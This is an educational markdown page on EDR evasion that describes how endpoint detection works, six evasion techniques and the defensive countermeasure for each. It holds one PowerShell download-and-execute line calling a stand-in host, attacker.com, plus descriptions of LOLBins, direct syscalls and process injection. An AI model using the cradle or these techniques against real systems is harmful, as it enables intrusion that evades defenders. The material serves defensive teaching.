---
title: "EDR Evasion"
topic: "edr-evasion"
tags: [edr, evasion, malware, detection, powershell, antivirus, red-team]
difficulty: advanced
day: 25
layout: default
parent: Topics
nav_order: 25
---

# EDR Evasion

## What You Will Learn
- What EDR is and how it detects malicious activity
- Common techniques attackers use to evade EDR
- How defenders can protect against these evasion tactics
- The role of scripting, signing, and encryption in evasion

## What Is It?

**EDR (Endpoint Detection and Response)** is a security technology designed to detect and respond to malicious activity on endpoints (computers, servers, mobile devices). EDR systems typically use a combination of techniques — network monitoring, behavioral analysis, and machine learning — to identify and stop threats.

EDR evasion is the practice of bypassing these detection mechanisms so that malicious payloads can execute without triggering alerts.

## Why It Matters

Modern red team operations and advanced persistent threat (APT) actors regularly use EDR evasion techniques. Defenders need to understand these techniques to build better detection rules, and penetration testers need to know them to accurately simulate real-world attackers.

## Key Concepts

### How EDR Works

EDR sensors typically:
- Hook Windows API calls (userland hooks) to monitor system calls
- Monitor the kernel through drivers for low-level operations
- Analyze process behavior, memory, and network activity
- Send telemetry to a backend for cloud-based analysis

The weakest link is userland API hooking — if an attacker can bypass those hooks, they bypass a significant portion of EDR detection.

## Common Evasion Techniques

### 1. Using Encrypted Traffic

Encrypting the payload makes it difficult for EDR systems to inspect and analyze traffic content, allowing the attacker to sneak past network-level defenses.

**Defense:** Use network traffic analysis tools that can decrypt SSL/TLS traffic for inspection.

### 2. Using Signed Applications (Living off the Land — LOLBins)

Attackers use legitimate, trusted, signed applications (like `msbuild.exe`, `regsvr32.exe`, or `certutil.exe`) to execute malicious payloads. EDR systems are typically configured to allow signed binaries to run.

**Defense:** Implement application whitelisting with behavioral restrictions, not just signature-based rules.

### 3. Using Scripting Languages (PowerShell, WMI)

Scripting languages are often used for legitimate purposes and may not be flagged by EDR systems. PowerShell is particularly powerful for executing in-memory payloads without touching the disk.

```powershell
# Example: Download and execute in memory (malicious pattern — for awareness only)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')
```

**Defense:** Enable PowerShell Script Block Logging and Constrained Language Mode.

### 4. Changing File Names or Modifying Headers

Attackers modify the file header or rename the payload to make it appear legitimate, tricking signature-based detection.

### 5. Direct Syscalls (Bypassing Userland Hooks)

Since EDR hooks are placed in userland (in DLLs like `ntdll.dll`), attackers can bypass them by calling syscalls directly using their syscall numbers — skipping the hooked DLL entirely.

```c
// Instead of calling NtOpenProcess() via ntdll.dll (which is hooked),
// call the syscall directly using the syscall number
// This bypasses EDR userland hooks
```

**Defense:** Implement kernel-level monitoring to catch direct syscalls.

### 6. Process Injection into Trusted Processes

Inject malicious code into a trusted process (like `explorer.exe`) so the malicious activity appears to come from a legitimate process.

**Defense:** Monitor for unusual memory allocations and cross-process writes.

## Defensive Countermeasures

To defend against EDR evasion:

1. **Network traffic analysis**: Inspect traffic even when encrypted, using SSL inspection where appropriate.
2. **Application whitelisting**: Only allow known, trusted applications to run.
3. **Machine learning behavioral analysis**: Detect unusual behavior regardless of signatures.
4. **Network segmentation**: Limit lateral movement even if a host is compromised.
5. **Patch management**: Keep systems updated to remove known vulnerabilities.
6. **Script block logging**: Enable detailed logging for PowerShell and other scripting environments.

## Resources

- [MITRE ATT&CK — Defense Evasion](https://attack.mitre.org/tactics/TA0005/)
- [TryHackMe — AV Evasion](https://tryhackme.com/room/avevasionshellcode)
- [Malware Development — Direct Syscalls](https://jmpesp.me/malware-analysis-syscalls-example/)
- [Red Team Notes — EDR Evasion](https://www.ired.team/offensive-security/defense-evasion)
